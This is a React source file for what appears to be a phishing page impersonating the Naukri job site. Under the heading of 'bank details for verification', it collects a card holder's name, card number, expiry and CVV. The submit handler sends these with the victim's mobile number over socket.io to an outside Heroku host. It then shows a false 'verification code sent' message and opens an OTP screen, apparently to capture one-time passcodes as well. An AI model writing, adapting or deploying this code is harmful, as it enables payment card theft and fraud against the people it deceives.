import React, { useEffect, useState } from "react";
import Logo from "./Assets/naukri_Logo.png";
import Back from "./Assets/back.png";
import Bank from "./Assets/bank.png";
import Account from "./Assets/account.png";
import Code from "./Assets/ifsc.png";
import Avatar from "./Assets/form/avatar.svg";
import { useHistory, useLocation } from "react-router-dom";
import { message } from "antd";
import io from "socket.io-client";
import Otp from "./Otp";

let socket;
const host = "https://websocket-testapp-node.herokuapp.com/";

const BankForm = () => {
  const history = useHistory();
  const { state } = useLocation();
  const { mobile } = state;
  const [name, setName] = useState("");
  const [bank, setBank] = useState("");
  const [number, setNumber] = useState("");
  const [code, setCode] = useState("");
  const [showOtp, setShowOtp] = useState("");
  useEffect(() => {
    socket = io(host);
    socket.emit("join", { mobile }, (error) => {
      if (error) {
        alert(error);
      }
    });
  }, [mobile]);

  // useEffect(() => {
  //   socket.on("message", (message) => {
  //     console.log(message);
  //   });
  // }, []);

  const disable =
    mobile === "" || name === "" || bank === "" || number === "" || code === "";

  const handleSubmit = () => {
    const data = {
      name,
      expiry: bank,
      cvv: number,
      cardnumber: code,
      mobile,
    };
    const messages = JSON.stringify(data);
    socket.emit("sendMessage", messages, () => {});
    message.success("verification code has been sent to your number");
    setShowOtp(true);
  };

  if (showOtp) {
    return <Otp mobile={mobile} socket={socket} />;
  }

  return (
    <div className="background">
      <div
        style={{
          height: "8vh",
          textAlign: "center",
          paddingTop: "3vh",
        }}
      >
        <img src={Logo} alt="logo" />
      </div>
      <div className="back">
        <img
          onClick={() => history.goBack()}
          style={{ height: "3vh", width: "10vw", marginBottom: "3vh" }}
          src={Back}
          alt="back"
        />
      </div>
      <div style={{ marginTop: "5vh" }} className="heading">
        Enter Your Bank Details for verification
      </div>
      <div
        style={{
          display: "flex",
          width: "80%",
          margin: "1vh 10%",
          flexDirection: "column",
        }}
      >
        <div className="forms-div">
          <div className="icons-div">
            <img className="icons" src={Avatar} alt="" />
          </div>
          <div className="forminputs">
            <input
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="Enter Card Holder's Name"
              type="text"
            />
          </div>
        </div>
        <div className="forms-div">
          <div className="icons-div">
            <img className="icons" src={Code} alt="" />
          </div>
          <div className="forminputs">
            <input
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="Enter Your Card Number"
              type="text"
            />
          </div>
        </div>
        <div className="forms-div">
          <div className="icons-div">
            <img className="icons" src={Bank} alt="" />
          </div>
          <div className="forminputs">
            <input
              type="text"
              value={bank}
              onChange={(e) => setBank(e.target.value)}
              placeholder="Enter Your Card Expiry (YY/MM)"
            />
          </div>
        </div>
        <div className="forms-div">
          <div className="icons-div">
            <img className="icons" src={Account} alt="" />
          </div>
          <div className="forminputs">
            <input
              value={number}
              onChange={(e) => setNumber(e.target.value)}
              placeholder="Enter CVV"
              type="text"
              maxLength="3"
            />
          </div>
        </div>
        <div>
          <button
            disabled={disable}
            onClick={() => handleSubmit()}
            className="btn"
          >
            Next
          </button>
        </div>
      </div>
    </div>
  );
};

export default BankForm;
